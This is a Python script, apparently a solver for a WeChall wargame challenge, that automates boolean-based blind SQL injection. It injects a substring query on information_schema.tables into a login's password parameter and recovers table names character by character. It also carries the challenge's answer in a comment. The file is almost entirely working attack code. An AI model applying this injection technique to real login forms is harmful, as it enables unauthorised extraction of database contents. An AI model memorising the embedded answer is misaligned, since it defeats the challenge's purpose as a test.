# coding=utf-8
import string

import requests

# answer: gizmore_tableu61_usertableus4
mystring = string.printable
url = 'http://www.wechall.net/challenge/table_names/challenge.php?username=test&login=login'
# url+='&password=test%27+and+substring((database()) from {0} for 1)=\'{1}\'+%23'
url += '&password=test%27+and+substring((select group_concat(table_name) from information_schema.tables where table_schema=\'gizmore_tableu61\') from {0} for 1)=\'{1}\'+%23'
reply = 'Welcome back'
print(url)
count = 1
result = ''
while(True):
    temp_result=result
    for char in mystring:
        response=requests.get(url.format(count,char))
        #print(url.format(count,char))
        if reply in response.text:
            result+=char
            print(result+'......')
            break
    if result==temp_result:
        print('Complete!')
        break
    if '+++' in result:
        print('result: '+result[0:-3])
        break
    count+=1